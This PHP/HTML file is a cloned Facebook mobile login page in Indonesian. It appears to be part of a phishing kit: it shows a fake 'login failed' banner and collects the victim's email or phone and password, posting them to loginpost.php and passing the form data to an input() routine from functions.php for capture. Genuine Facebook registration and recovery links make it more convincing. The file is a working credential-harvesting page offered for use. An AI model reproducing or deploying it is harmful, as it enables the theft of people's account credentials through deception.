<?php
require 'functions.php';
if(isset($_POST["submit"])){
input($_POST);}
?>
 
<!-- Gagal HTML -->
<html>

<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3mobile.css">
<link rel="icon" type="image/png" href="res/ikon.png"/>

<!-----Including CSS----->
<link rel="stylesheet" type="text/css" href="stile.css">

 <!-- Top Nav -->
  <div class="topnav" id="myTopnav">
  <font style="
	color: white;
	float: center;
	font-family: fblogo;
    display: block;
    text-align: center;
    padding: 0px 0px;
    text-decoration: none;
    font-size: 160%;">facebook</font> 
	</div>
  
 <head>
  <title>Selamat datang di Facebook</title>
 </head>
 
<body>
<!-- Gagal Nav -->
<div class="gagal">
Email atau nomor ponsel yang Anda masukkan tidak cocok dengan akun mana saja. <b>Buat sebuah akun.</b>
</div>
<div class="boddy">

<br>
<center>
<form action="loginpost.php" method="POST">
  <input style="width: 300px;"" name="email" type="text" placeholder="Email atau Telepon" maxlength="72" required>
  <br><input style="width: 300px;" name="password" type="password" placeholder="Kata Sandi" maxlength="72" required>
  <br><input style="width: 300px;" name="submit" type="submit" value="Masuk" class="masuk">
</form>

<p class="atau"> - atau - </font>
<br>
<form action="https://m.facebook.com/reg/">
<input type="submit" class="akun" value="Buat Akun Baru">
</form>
<a href="https://m.facebook.com/recover/initiate/" class="lupa">Lupa Kata Sandi? - Pusat Bantuan</a> 
</center>

<br>
<br>

</div>

<p class="bahasa">&nbsp;&nbsp;<b>Bahasa Indonesia</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;English (UK)&nbsp;&nbsp;&nbsp; <br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Basa Jawa&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bahasa Melayu <br> &nbsp;&nbsp;Japanese&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Espanol <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Portugues (Brasil)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p class="copyright">Facebook &copy; 2017</p>

</body>
</html>